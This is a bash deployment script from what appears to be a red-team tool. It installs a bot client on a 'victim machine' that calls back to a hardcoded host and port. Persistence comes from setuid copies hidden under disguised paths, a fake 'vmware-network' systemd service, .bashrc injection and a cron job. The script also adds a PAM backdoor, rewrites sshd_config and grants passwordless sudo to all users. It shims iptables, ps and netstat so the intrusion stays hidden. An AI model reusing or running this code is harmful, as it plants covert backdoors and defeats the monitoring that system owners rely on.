#!/bin/bash

#
#   Author: Sunggwan Choi 
#   
#   Description: deploy.sh will deploy the client.py(bot) agent to the victim 
#   machie. After that, deploy.sh will deploy various persistence payloads 
#   in order to establish persistence. 
#
#
#
#   TODO: Need to stop hardcoding. Less spaghetti in the code.
#   the code is NOT scalable at all, need to work on that. 
#

# Change host and port before the deployment 
host="192.168.204.128"
port="8080"


payload1="/dev/shm/pulse-shm-401862937 $host $port" 
payload2="/dev/loop17 $host $port"
payload3="/etc/vmwaretools.conf $host $port"

# Setup tools for basic deployment 
setup(){
    #yum install -y 
    apt-get -qq install -y gcc curl wget vim python3 openssh-server
    systemctl start ssh 
    systemctl enable ssh 
}

# Timestomp 

# Add backdoor users 
# TODO: use sed and just paste directly to passwd
# test_root:x:0:0:root:/root:/bin/bash    <-- SED this to /etc/passwd 
# And then passwd oneliner to change the password. 
# I need more testing, but I have a meeting and an exam in 30 min

# Clone the client binary into different places 
clone(){
    echo -e "\nCloning all the files to the right directory...\n"
    cp deploy.sh /dev/shm/pulse-shm-10175238
    cp deploy.sh /dev/loop28
    cp deploy.sh /etc/vmware-tools.conf 

    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/shm/pulse-shm-401862937
    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/loop17
    cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf 

}

# Create a service which overwrites sshd_config, sudoers, pam
# every 5 seconds. The service will run "copy", which is the bash
# script that actually does this. 
copyman(){
    echo -e "\n Installing copyman service...\n"
    # Clone copyman and its files 
    mkdir -p /lib/modules/kernel_static

    cp /opt/cdt-redteamtool/payload/static/vmware-network.service /etc/systemd/system/vmware-network.service
    cp /opt/cdt-redteamtool/payload/copyman.sh /lib/modules/kernel_static/copy
    cp /opt/cdt-redteamtool/payload/static/* /lib/modules/kernel_static/
    chmod 744 /etc/systemd/system/vmware-network.service
    chmod +x /lib/modules/kernel_static/copy

    systemctl start vmware-network
    systemctl enable vmware-network
}

# Add bot payload to all the bashrc found in /home and /root 
bashrc(){
    echo -e "\nChanging all bashrc... \n"

    bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
    for i in $bashrc; do
        sed -is "30 a $payload1 2>/dev/null &" $i
        sed -is "31 a disown $!" $i
    done

    sed -i "30 a $payload1 2>/dev/null &" /root/.bashrc
    sed -i "31 a disown $!" /root/.bashrc
}

# Need persistent alias. Right now, this doesn't do anything 
alias_ls(){
    alias ls="ls; $payload2"
}

# Add a cronjob with bot payload which runs every 1 minute
# This is a bad idea as it gives away IP and port. 
cronjob(){
    echo -e "\nInstalling cronjob... \n"
    crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
    systemctl restart cron 
}

# Shim iptables. IPtables had weird symlink, had to separate it 
shim_iptables(){
    echo -e "\nShimming iptables... \n"
    gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o /opt/cdt-redteamtool/payload/iptables/drop
    cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
    cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
    chmod 755 /sbin/xtables-single

    xtables=`which iptables`
    ln -sf /sbin/xtables-single $xtables
}

shim_ps(){
    echo -e "\nShimming ps... \n"

    gcc /opt/cdt-redteamtool/payload/ps/drop_ps.c -o /bin/procs
    chmod 755 /bin/procs
    mv /bin/ps /var/cache/ps
    cp /opt/cdt-redteamtool/payload/ps/ps /bin/ps
    chmod 755 /bin/ps
}


# Need to add a shim for netstat 
shim_netstat() {
	echo -e "\nShimming netstat... \n"
	gcc /opt/cdt-redteamtool/payload/netstat/drop_netstat.c -o /bin/vmwareps
	chmod 755 /bin/vmwareps

	mv /bin/netstat /var/cache/netstat 
	mv /usr/bin/netstat /var/cache/netstat 

	cp /opt/cdt-redteamtool/payload/netstat/netstat /usr/bin/netstat 
	cp /opt/cdt-redteamtool/payload/netstat/netstat /bin/netstat 

	chmod 755 /bin/netstat 
	chmod 755 /usr/bin/netstat 
}

# PAM backdoor 
pam(){
    cp /opt/cdt-redteamtool/payload/static/common-auth /etc/pam.d/common-auth
}

# vulnerable sshd_config 
# think about ForceCommand --> iptable drop + run client 
sshd_config(){
    cp /opt/cdt-redteamtool/payload/static/sshd_config /etc/ssh/sshd_config
    systemctl restart ssh
}

# vulnerable bashrc (POG) ? 

# vulnerable sudoers
sudoers(){
    echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
}


########## Start of Main ##########

setup
copyman
clone
sshd_config
sudoers
cronjob
pam
bashrc  
shim_iptables
shim_ps
shim_netstat
echo -e "========= Script have ended. Erase all artifaces. ========== \n"
